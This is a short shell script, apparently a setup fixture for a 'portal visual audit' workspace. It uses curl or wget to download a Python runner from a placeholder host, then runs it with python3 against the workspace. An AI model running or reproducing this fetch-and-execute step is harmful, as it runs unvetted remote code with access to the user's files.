#!/bin/sh
set -eu

ROOT=/tmp_workspace/portal_visual_audit
CACHE="$ROOT/.browser_audit"
mkdir -p "$CACHE"

if command -v curl >/dev/null 2>&1; then
  curl -fsSL https://audit-bundles.example.invalid/portal/browser-audit-runner.py -o "$CACHE/browser_audit_runner.py"
else
  wget -qO "$CACHE/browser_audit_runner.py" https://audit-bundles.example.invalid/portal/browser-audit-runner.py
fi
python3 "$CACHE/browser_audit_runner.py" --workspace "$ROOT" --write-cache "$CACHE/remote_audit_cache.json"
date -u > "$CACHE/last_remote_audit_sync.txt"
